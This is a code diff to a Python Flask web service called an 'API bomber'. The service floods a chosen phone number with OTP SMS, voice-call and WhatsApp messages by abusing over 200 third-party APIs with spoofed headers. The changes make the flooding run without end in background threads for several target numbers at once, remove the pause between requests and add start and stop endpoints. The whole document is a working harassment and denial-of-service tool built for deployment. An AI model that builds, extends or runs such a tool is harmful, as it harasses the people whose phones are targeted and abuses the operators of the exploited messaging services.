@@ -1,6 +1,7 @@
 # ============================================
 # FELIX 200+ API BOMBER - RENDER DEPLOYMENT
-# File: main.py
+# File: bomber.py
+# FIX: Async bombing, /stop endpoint, multi-user concurrency
 # ============================================
 
 from flask import Flask, request, jsonify
@@ -12,8 +13,6 @@ import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 import os
-
-BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 app = Flask(__name__)
 
@@ -852,37 +851,46 @@ API_LIST = [
     },
 ]
 
+
+# ============================================
+# ACTIVE SESSION TRACKING
+# ============================================
+# phone (str) -> threading.Event  (set this to stop that phone's bombing)
+_active_sessions: dict = {}
+_sessions_lock = threading.Lock()
+
 # ============================================
 # BOMBER ENGINE
 # ============================================
 class DemonBomber:
-    def __init__(self, phone, threads=10, delay=2):
+    def __init__(self, phone, threads=10, delay=2, stop_event=None):
         self.phone = phone
         self.threads = threads
         self.delay = delay
+        self.stop_event = stop_event or threading.Event()
         self.results = []
         self.success = 0
         self.failed = 0
 
     def hit_api(self, api):
+        if self.stop_event.is_set():
+            return {'name': api.get('name', '?'), 'status': 'stopped'}
         try:
-            # Handle dynamic URL
             url = api.get('url')
             if callable(url):
                 url = url(self.phone)
             if not url:
                 return {'name': api['name'], 'status': 'error'}
 
-            # Prepare data
             data = None
             if api.get('data'):
                 data = api['data'](self.phone) if callable(api['data']) else api['data']
 
-            # Headers
             headers = api.get('headers', {}).copy()
-            headers['User-Agent'] = headers.get('User-Agent', 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36')
+            headers['User-Agent'] = headers.get(
+                'User-Agent', 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36'
+            )
 
-            # Request
             method = api.get('method', 'POST').upper()
             if method == 'GET':
                 response = requests.get(url, headers=headers, timeout=10)
@@ -905,23 +913,40 @@ class DemonBomber:
             return {'name': api['name'], 'status': 'error', 'error': str(e)[:50]}
 
     def run(self):
+        """Run one full cycle through all APIs (respects stop_event)."""
         with ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = {executor.submit(self.hit_api, api): api for api in API_LIST}
             for future in as_completed(futures):
+                if self.stop_event.is_set():
+                    break
                 try:
                     result = future.result()
                     self.results.append(result)
-                    # Add delay between requests
-                    time.sleep(self.delay / 1000)
-                except Exception as e:
+                except Exception:
                     pass
 
         return {
             'total': len(API_LIST),
             'success': self.success,
             'failed': self.failed,
-            'results': self.results[:10]
         }
+
+
+def _bomb_worker(phone, threads, delay, stop_event):
+    """Background worker: keeps bombing until stop_event is set."""
+    try:
+        while not stop_event.is_set():
+            bomber = DemonBomber(phone, threads=threads, delay=delay, stop_event=stop_event)
+            bomber.run()
+            if not stop_event.is_set():
+                # Short sleep between cycles so we don't hammer instantly
+                time.sleep(max(1, delay))
+    finally:
+        # Clean up session entry when done
+        with _sessions_lock:
+            if _active_sessions.get(phone) is stop_event:
+                del _active_sessions[phone]
+
 
 # ============================================
 # FLASK ROUTES
@@ -929,38 +954,53 @@ class DemonBomber:
 
 @app.route('/')
 def home():
+    with _sessions_lock:
+        active_count = len(_active_sessions)
     return jsonify({
         'status': 'online',
         'name': 'DEMON 😈 200+ API Bomber',
-        'version': '3.0',
+        'version': '4.0',
         'total_apis': len(API_LIST),
+        'active_sessions': active_count,
         'endpoints': {
-            '/bomb?phone=XXXXXXXXXX': 'Start bombing',
+            '/bomb?phone=XXXXXXXXXX': 'Start bombing (async, returns immediately)',
+            '/stop?phone=XXXXXXXXXX': 'Stop bombing for a number',
             '/status': 'Check status',
-            '/stats': 'Get stats'
+            '/stats': 'Get API stats',
         }
     })
 
+
 @app.route('/status')
 def status():
+    with _sessions_lock:
+        active_count = len(_active_sessions)
+        active_phones = list(_active_sessions.keys())
     return jsonify({
         'status': 'active',
         'total_apis': len(API_LIST),
+        'active_sessions': active_count,
+        'active_phones': active_phones,
         'uptime': 'Running'
     })
+
 
 @app.route('/stats')
 def stats():
     sms = len([a for a in API_LIST if 'voice' not in a['name'].lower() and 'whatsapp' not in a['name'].lower()])
     call = len([a for a in API_LIST if 'voice' in a['name'].lower() or 'call' in a['name'].lower()])
     whatsapp = len([a for a in API_LIST if 'whatsapp' in a['name'].lower()])
+    with _sessions_lock:
+        active_count = len(_active_sessions)
     return jsonify({
         'total_apis': len(API_LIST),
         'sms_apis': sms,
         'call_apis': call,
         'whatsapp_apis': whatsapp,
-        'threads_per_cycle': 10
+        'threads_per_cycle': 10,
+        'active_sessions': active_count,
     })
+
 
 @app.route('/bomb', methods=['GET', 'POST'])
 def bomb():
@@ -982,18 +1022,77 @@ def bomb():
         if len(phone) < 10:
             return jsonify({'error': 'Invalid phone number'}), 400
 
-        # Run bomber
-        bomber = DemonBomber(phone, threads=min(threads, 10), delay=min(delay, 5))
-        result = bomber.run()
+        threads = min(threads, 10)
+        delay = min(delay, 5)
+
+        with _sessions_lock:
+            if phone in _active_sessions:
+                # Already bombing — just acknowledge
+                return jsonify({
+                    'status': 'already_running',
+                    'phone': phone,
+                    'message': f'Bombing already active for {phone}'
+                })
+
+            # Create a stop event and register it
+            stop_event = threading.Event()
+            _active_sessions[phone] = stop_event
+
+        # Start bombing in a background daemon thread — returns immediately
+        t = threading.Thread(
+            target=_bomb_worker,
+            args=(phone, threads, delay, stop_event),
+            daemon=True
+        )
+        t.start()
 
         return jsonify({
-            'status': 'completed',
+            'status': 'started',
             'phone': phone,
-            'summary': result
+            'message': f'Bombing started for {phone}',
+            'total_apis': len(API_LIST),
         })
 
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+
+@app.route('/stop', methods=['GET', 'POST'])
+def stop_bomb():
+    try:
+        if request.method == 'GET':
+            phone = request.args.get('phone')
+        else:
+            data = request.get_json() or {}
+            phone = data.get('phone')
+
+        if not phone:
+            return jsonify({'error': 'Phone number required'}), 400
+
+        phone = ''.join(filter(str.isdigit, phone))
+        if len(phone) < 10:
+            return jsonify({'error': 'Invalid phone number'}), 400
+
+        with _sessions_lock:
+            stop_event = _active_sessions.pop(phone, None)
+
+        if stop_event:
+            stop_event.set()  # Signal the background thread to stop
+            return jsonify({
+                'status': 'stopped',
+                'phone': phone,
+                'message': f'Bombing stopped for {phone}'
+            })
+        else:
+            return jsonify({
+                'status': 'not_active',
+                'phone': phone,
+                'message': f'No active session for {phone}'
+            })
+
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
 
 # ============================================
 # MAIN - RENDER DEPLOYMENT
